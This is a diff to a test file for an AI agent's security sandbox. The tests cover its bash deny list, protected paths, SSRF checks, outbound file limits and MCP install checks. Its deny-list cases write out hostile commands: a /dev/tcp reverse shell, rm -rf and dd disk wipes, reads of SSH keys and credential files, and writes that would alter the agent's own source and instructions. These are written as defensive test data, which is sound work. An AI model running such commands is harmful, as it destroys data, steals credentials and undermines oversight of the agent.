@@ -1,8 +1,12 @@
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import { sanitizeMemory, redactSecrets, INJECTION_PATTERNS, CREDENTIAL_PATTERNS } from '../src/types.js';
-import { findBashDeny, findProtectedPath, findSensitivePath, normalizeCommand } from '../src/hooks.js';
-import { isSafeOutboundUrl } from '../src/tools.js';
+import { findBashDeny, findProtectedPath, findSensitivePath, isUnsafeGlob, normalizeCommand } from '../src/hooks.js';
+import { isSafeOutboundUrl, isAllowedOutboundFile, isDangerousMcpInvocation, isSafeMcpEnvEntry } from '../src/tools.js';
+import { isPublicIpAddress, canonicalPath } from '../src/security.js';
+import { mkdtempSync, mkdirSync, rmSync, writeFileSync, symlinkSync } from 'node:fs';
+import { tmpdir } from 'node:os';
+import { join } from 'node:path';
 
 // --- Bash deny patterns ---
 
@@ -21,6 +25,9 @@ const MUST_DENY: Array<[string, string]> = [
   ['reverse shell /dev/tcp', 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'],
   ['mkfifo', 'mkfifo /tmp/f; cat /tmp/f | sh'],
   ['chained rm -rf', 'date; rm -rf /'],
+  ['standalone rm -rf /', 'rm -rf /'],
+  ['standalone rm -rf /opt', 'rm -rf /opt'],
+  ['standalone rm -rf home', 'rm -rf ~'],
   ['dd of=', 'dd if=/dev/urandom of=/dev/sda'],
   ['read .env via cat', 'cat /opt/cakeagent/.env'],
   ['read id_rsa', 'head ~/.ssh/id_rsa'],
@@ -81,10 +88,20 @@ const MUST_DENY: Array<[string, string]> = [
   ['netfilter-persistent flush', 'sudo netfilter-persistent flush'],
   ['iptables-restore', 'sudo iptables-restore < /tmp/rules'],
   ['ip6tables-restore', 'sudo ip6tables-restore -c < /tmp/rules6'],
-  ['redirect to src', 'echo hack > /opt/cakeagent/src/agent.ts'],
-  ['sed -i to src', 'sed -i s/a/b/ /opt/cakeagent/src/index.ts'],
-  ['redirect to skills', 'echo fake > /opt/cakeagent/data/skills/x.md'],
-  ['npm run build', 'npm run build'],
+  ['redirect to src', `echo hack > ${process.cwd()}/src/agent.ts`],
+  ['sed -i to src', `sed -i s/a/b/ ${process.cwd()}/src/index.ts`],
+  ['redirect to skills', `echo fake > ${process.cwd()}/data/skills/x.md`],
+  ['relative data write', 'echo fake > ../../data/skills/x.md'],
+  ['tilde ssh read', 'cat ~/.ssh/id_rsa'],
+  ['claude credentials read', 'cat ~/.claude/.credentials.json'],
+  ['newline bypass', 'cat\n.env'],
+  ['relative source write', 'sed -i s/a/b/ ../../src/index.ts'],
+  ['cd then relative source write', 'cd ../../ && echo hack > src/index.ts'],
+  ['cd then relative data write', 'cd ../../data && echo hack > memory.md'],
+  ['protected claude settings write', 'echo {} > groups/main/.claude/settings.json'],
+  ['claude.md write', 'echo hack > ../../CLAUDE.md'],
+  ['trusted helper command cannot smuggle a source write',
+    'sudo bash /usr/local/lib/cakeagent/setup.sh install-config /etc/nginx/sites-available/x /opt/cakeagent/data/tmp/x && echo hack > ../../src/index.ts'],
   ['unicode whitespace', 'echo hi\u00A0/bin/sh'],
   ['control char', 'echo hi\x07'],
   ['IFS=', 'IFS=, read a b c'],
@@ -117,12 +134,13 @@ const MUST_ALLOW: Array<[string, string]> = [
   ['ls path', 'ls /tmp'],
   ['git clone', 'git clone --depth 1 https://github.com/x/y.git'],
   ['python script', 'python3 script.py --arg value'],
+  ['npm build in user project', 'npm run build'],
   // Server autonomy — writing config files via the install-config helper.
   // Recommended flow: Write tool writes a staging file under data/tmp/, then:
-  ['install-config nginx from file', 'sudo bash /opt/cakeagent/setup.sh install-config /etc/nginx/sites-available/app /opt/cakeagent/data/tmp/app.conf'],
-  ['install-config systemd unit', 'echo "[Unit]" | sudo bash /opt/cakeagent/setup.sh install-config /etc/systemd/system/myapp.service'],
-  ['install-config sysctl', 'echo "net.ipv4.ip_forward=1" | sudo bash /opt/cakeagent/setup.sh install-config /etc/sysctl.d/99-custom.conf'],
-  ['remove-config cleanup', 'sudo bash /opt/cakeagent/setup.sh remove-config /etc/nginx/sites-available/app'],
+  ['install-config nginx from file', 'sudo bash /usr/local/lib/cakeagent/setup.sh install-config /etc/nginx/sites-available/app /opt/cakeagent/data/tmp/app.conf'],
+  ['install-config systemd unit', 'echo "[Unit]" | sudo bash /usr/local/lib/cakeagent/setup.sh install-config /etc/systemd/system/myapp.service'],
+  ['install-config sysctl', 'echo "net.ipv4.ip_forward=1" | sudo bash /usr/local/lib/cakeagent/setup.sh install-config /etc/sysctl.d/99-custom.conf'],
+  ['remove-config cleanup', 'sudo bash /usr/local/lib/cakeagent/setup.sh remove-config /etc/nginx/sites-available/app'],
   ['systemctl reload nginx', 'sudo systemctl reload nginx'],
   ['systemctl restart nginx', 'sudo systemctl restart nginx'],
   ['systemctl daemon-reload', 'sudo systemctl daemon-reload'],
@@ -165,9 +183,9 @@ const MUST_ALLOW: Array<[string, string]> = [
   ['netfilter-persistent save', 'sudo netfilter-persistent save'],
   ['netfilter-persistent reload', 'sudo netfilter-persistent reload'],
   // certbot + harden-sshd wrappers via setup.sh
-  ['setup.sh certbot', 'sudo bash /opt/cakeagent/setup.sh certbot certonly --webroot -w /var/www/html -d example.com --non-interactive --agree-tos -m admin@example.com'],
-  ['setup.sh certbot renew', 'sudo bash /opt/cakeagent/setup.sh certbot renew --quiet'],
-  ['setup.sh harden-sshd', 'sudo bash /opt/cakeagent/setup.sh harden-sshd'],
+  ['setup.sh certbot', 'sudo bash /usr/local/lib/cakeagent/setup.sh certbot certonly --webroot -w /var/www/html -d example.com --non-interactive --agree-tos -m admin@example.com'],
+  ['setup.sh certbot renew', 'sudo bash /usr/local/lib/cakeagent/setup.sh certbot renew --quiet'],
+  ['setup.sh harden-sshd', 'sudo bash /usr/local/lib/cakeagent/setup.sh harden-sshd'],
   // Podman — rootless, no sudo
   ['podman pull', 'podman pull docker.io/library/alpine'],
   ['podman run', 'podman run --rm alpine echo hi'],
@@ -200,15 +218,15 @@ test('sensitive path: ordinary dirs pass', () => {
 // --- Protected path patterns (Write/Edit) ---
 
 test('protected path: blocks source, mcp config, skills markdown, tsconfig', () => {
-  assert.ok(findProtectedPath('/opt/cakeagent/src/index.ts'));
-  assert.ok(findProtectedPath('/opt/cakeagent/channels/telegram.ts'));
-  assert.ok(findProtectedPath('/opt/cakeagent/dist/src/index.js'));
-  assert.ok(findProtectedPath('/opt/cakeagent/.mcp.json'));
-  assert.ok(findProtectedPath('/opt/cakeagent/data/skills/outlook.md'));
-  assert.ok(findProtectedPath('/opt/cakeagent/package.json'));
-  assert.ok(findProtectedPath('/opt/cakeagent/tsconfig.json'));
-  assert.ok(findProtectedPath('/opt/cakeagent/cakeagent.service'));
-  assert.ok(findProtectedPath('/opt/cakeagent/groups/main/CLAUDE.md'));
+  assert.ok(findProtectedPath(`${process.cwd()}/src/index.ts`));
+  assert.ok(findProtectedPath(`${process.cwd()}/channels/telegram.ts`));
+  assert.ok(findProtectedPath(`${process.cwd()}/dist/src/index.js`));
+  assert.ok(findProtectedPath(`${process.cwd()}/.mcp.json`));
+  assert.ok(findProtectedPath(`${process.cwd()}/data/skills/outlook.md`));
+  assert.ok(findProtectedPath(`${process.cwd()}/package.json`));
+  assert.ok(findProtectedPath(`${process.cwd()}/tsconfig.json`));
+  assert.ok(findProtectedPath(`${process.cwd()}/cakeagent.service`));
+  assert.ok(findProtectedPath(`${process.cwd()}/groups/main/CLAUDE.md`));
 });
 
 test('protected path: blocks critical /etc/ files', () => {
@@ -257,9 +275,9 @@ test('protected path: allows non-critical /etc/ files (routed via install-config
   assert.equal(findProtectedPath('/etc/letsencrypt/cli.ini'), null);
 });
 
-test('protected path: data/memory.md and ordinary files are allowed', () => {
-  assert.equal(findProtectedPath('/opt/cakeagent/data/memory.md'), null);
-  assert.equal(findProtectedPath('/opt/cakeagent/groups/main/notes/today.md'), null);
+test('protected path: memory.md must use the memory tools; ordinary files are allowed', () => {
+  assert.ok(findProtectedPath(`${process.cwd()}/data/memory.md`));
+  assert.equal(findProtectedPath(`${process.cwd()}/groups/main/notes/today.md`), null);
 });
 
 // --- Injection patterns ---
@@ -395,4 +413,163 @@ test('ssrf: rejects malformed URLs', () => {
 test('ssrf: public 172.32.x.x (just outside 172.16/12) is allowed', () => {
   // 172.32 is outside the private range — the check must not be overly broad.
   assert.equal(isSafeOutboundUrl('https://172.32.0.1/').ok, true);
+});
+
+
+// --- New hardening regressions ---
+
+test('bash deny: attached interpreter code after quote removal', () => {
+  for (const cmd of [
+    "bash -c'id'",
+    "bash -lc'id'",
+    "dash -c'id'",
+    "fish -c 'id'",
+    "python3 -c'print(1)'",
+    "perl -E'print 1'",
+    "node --eval'console.log(1)'",
+    "bun -e'console.log(1)'",
+  ]) {
+    assert.ok(findBashDeny(cmd), `expected denial: ${cmd}`);
+  }
+});
+
+test('bash allow: ordinary parameter expansion remains usable', () => {
+  assert.equal(findBashDeny('for f in *.md; do echo "${f}"; done'), null);
+  assert.equal(findBashDeny('echo $HOME'), null);
+});
+
+test('bash deny: recursive search roots that contain protected state', () => {
+  assert.ok(findBashDeny(`grep -r token ${join(process.cwd(), 'data')}`));
+  assert.ok(findBashDeny(`grep -r token ${process.cwd()}`));
+  assert.ok(findBashDeny('grep -r token /etc'));
+  assert.ok(findBashDeny(`cat ${join(process.cwd(), 'data', 'settings.json')}`));
+  assert.equal(findBashDeny(`cat ${join(process.cwd(), 'data', 'downloads', 'file.txt')}`), null);
+});
+
+test('bash deny: cross-group reads and traversal', () => {
+  const root = mkdtempSync(join(tmpdir(), 'cakeagent-groups-'));
+  const groups = join(root, 'groups');
+  const main = join(groups, 'main');
+  const other = join(groups, 'other');
+  mkdirSync(main, { recursive: true });
+  mkdirSync(other, { recursive: true });
+  writeFileSync(join(other, 'secret.txt'), 'secret');
+  writeFileSync(join(main, 'notes.txt'), 'notes');
+  try {
+    assert.ok(findBashDeny(`cat ${join(other, 'secret.txt')}`, main, join(root, 'data'), groups));
+    assert.ok(findBashDeny('cat ../other/secret.txt', main, join(root, 'data'), groups));
+    assert.ok(findBashDeny('cd .. && ls', main, join(root, 'data'), groups));
+    assert.equal(findBashDeny(`cat ${join(main, 'notes.txt')}`, main, join(root, 'data'), groups), null);
+  } finally {
+    rmSync(root, { recursive: true, force: true });
+  }
+});
+
+test('ssrf: DNS result ranges are rejected', () => {
+  for (const ip of ['127.0.0.1', '10.0.0.1', '172.16.0.1', '192.168.1.1', '169.254.169.254', '100.64.0.1', '198.18.0.1', '203.0.113.1', '192.0.2.1', '0.0.0.0', '224.0.0.1']) {
+    assert.equal(isPublicIpAddress(ip), false, ip);
+  }
+  for (const ip of ['::1', 'fc00::1', 'fd12:3456::1', 'fe80::1', 'ff02::1', '2001:db8::1', '2001::1', '2002:7f00:1::1', '64:ff9b::7f00:1']) {
+    assert.equal(isPublicIpAddress(ip), false, ip);
+  }
+  assert.equal(isPublicIpAddress('8.8.8.8'), true);
+  assert.equal(isPublicIpAddress('2606:4700:4700::1111'), true);
+  assert.equal(isPublicIpAddress('not-an-ip'), false);
+});
+
+test('ssrf: trailing-dot loopback and IPv6 literal URLs are rejected', () => {
+  assert.equal(isSafeOutboundUrl('https://localhost./x').ok, false);
+  assert.equal(isSafeOutboundUrl('https://[::1]/x').ok, false);
+  assert.equal(isSafeOutboundUrl('https://user:pass@example.com/x').ok, false);
+});
+
+test('outbound file: only group and download/tmp files are eligible; symlinks resolve', () => {
+  const root = mkdtempSync(join(tmpdir(), 'cakeagent-outbound-'));
+  const data = join(root, 'data');
+  const groups = join(root, 'groups');
+  const base = join(groups, 'main');
+  const other = join(groups, 'other');
+  mkdirSync(base, { recursive: true });
+  mkdirSync(other, { recursive: true });
+  mkdirSync(join(data, 'downloads'), { recursive: true });
+  mkdirSync(join(data, 'tmp'), { recursive: true });
+  writeFileSync(join(base, 'note.txt'), 'note');
+  writeFileSync(join(other, 'secret.txt'), 'secret');
+  writeFileSync(join(data, 'settings.json'), 'secret');
+  writeFileSync(join(data, 'downloads', 'photo.jpg'), 'image');
+  writeFileSync(join(data, 'tmp', 'staged.conf'), 'config');
+  symlinkSync(join(data, 'settings.json'), join(base, 'leak.txt'));
+  try {
+    assert.equal(isAllowedOutboundFile(join(base, 'note.txt'), data, groups, base).ok, true);
+    assert.equal(isAllowedOutboundFile(join(data, 'downloads', 'photo.jpg'), data, groups, base).ok, true);
+    assert.equal(isAllowedOutboundFile(join(data, 'tmp', 'staged.conf'), data, groups, base).ok, true);
+    assert.equal(isAllowedOutboundFile(join(data, 'settings.json'), data, groups, base).ok, false);
+    assert.equal(isAllowedOutboundFile(join(other, 'secret.txt'), data, groups, base).ok, false);
+    assert.equal(isAllowedOutboundFile(join(base, 'leak.txt'), data, groups, base).ok, false);
+  } finally {
+    rmSync(root, { recursive: true, force: true });
+  }
+});
+
+
+test('glob: path patterns cannot escape their search root', () => {
+  assert.equal(isUnsafeGlob('/etc/passwd'), true);
+  assert.equal(isUnsafeGlob('../../other/**'), true);
+  assert.equal(isUnsafeGlob('sub/../other/**'), true);
+  assert.equal(isUnsafeGlob('~/.ssh/**'), true);
+  assert.equal(isUnsafeGlob('$HOME/**'), true);
+  assert.equal(isUnsafeGlob('**/*.md'), false);
+  assert.equal(isUnsafeGlob('notes-2026.txt'), false);
+});
+
+test('downloads: groups can only read/send their own incoming files', () => {
+  const root = mkdtempSync(join(tmpdir(), 'cakeagent-downloads-'));
+  const data = join(root, 'data');
+  const groups = join(root, 'groups');
+  const a = join(groups, 'family');
+  const b = join(groups, 'work');
+  mkdirSync(a, { recursive: true });
+  mkdirSync(b, { recursive: true });
+  mkdirSync(join(data, 'downloads', 'family'), { recursive: true });
+  mkdirSync(join(data, 'downloads', 'work'), { recursive: true });
+  writeFileSync(join(data, 'downloads', 'family', 'a.jpg'), 'a');
+  writeFileSync(join(data, 'downloads', 'work', 'b.jpg'), 'b');
+  try {
+    assert.equal(isAllowedOutboundFile(join(data, 'downloads', 'family', 'a.jpg'), data, groups, a, 'family').ok, true);
+    assert.equal(isAllowedOutboundFile(join(data, 'downloads', 'work', 'b.jpg'), data, groups, a, 'family').ok, false);
+    assert.equal(isAllowedOutboundFile(join(data, 'downloads', 'a.jpg'), data, groups, a, 'family').ok, false);
+    assert.equal(isAllowedOutboundFile(join(data, 'downloads', 'b.jpg'), data, groups, a, 'main').ok, false);
+    assert.ok(findSensitivePath(canonicalPath(join(data, 'downloads', 'work', 'b.jpg')), data, 'family'));
+    assert.equal(findSensitivePath(canonicalPath(join(data, 'downloads', 'family', 'a.jpg')), data, 'family'), null);
+    assert.ok(findProtectedPath(canonicalPath(join(data, 'downloads', 'work', 'b.jpg')), data, 'family'));
+  } finally {
+    rmSync(root, { recursive: true, force: true });
+  }
+});
+
+test('bash: installation root and standalone destructive rm are protected', () => {
+  assert.ok(findBashDeny('rm -rf /'));
+  assert.ok(findBashDeny(`rm -rf ${process.cwd()}`));
+  assert.ok(findBashDeny(`rm -rf ${process.cwd()}/*`));
+  assert.ok(findBashDeny('cat /proc/self/mem'));
+  assert.ok(findBashDeny('cat /dev/fd/3'));
+});
+
+
+test('mcp install: dangerous container and interpreter arguments are rejected', () => {
+  assert.equal(isDangerousMcpInvocation('docker', ['run', '-v', '/etc:/host', 'image']), true);
+  assert.equal(isDangerousMcpInvocation('docker', ['run', '--volume=/var:/host', 'image']), true);
+  assert.equal(isDangerousMcpInvocation('docker', ['run', '--mount', 'type=bind,source=/etc,target=/x', 'image']), true);
+  assert.equal(isDangerousMcpInvocation('docker', ['run', '--env-file', '/opt/cakeagent/.env', 'image']), true);
+  assert.equal(isDangerousMcpInvocation('node', ['-e', 'process.exit()']), true);
+  assert.equal(isDangerousMcpInvocation('npx', ['-y', '@modelcontextprotocol/server-filesystem', '/tmp']), false);
+});
+
+test('mcp install: loader and path environment variables are rejected', () => {
+  for (const key of ['NODE_OPTIONS', 'LD_PRELOAD', 'PYTHONPATH', 'PATH', 'DOCKER_HOST', 'BASH_ENV']) {
+    assert.equal(isSafeMcpEnvEntry(key, 'x'), false, key);
+  }
+  assert.equal(isSafeMcpEnvEntry('GITHUB_TOKEN', 'ghp_abcdefghijklmnopqrstuvwxyz'), true);
+  assert.equal(isSafeMcpEnvEntry('bad-key', 'x'), false);
+  assert.equal(isSafeMcpEnvEntry('OK', 'x'.repeat(4097)), false);
 });
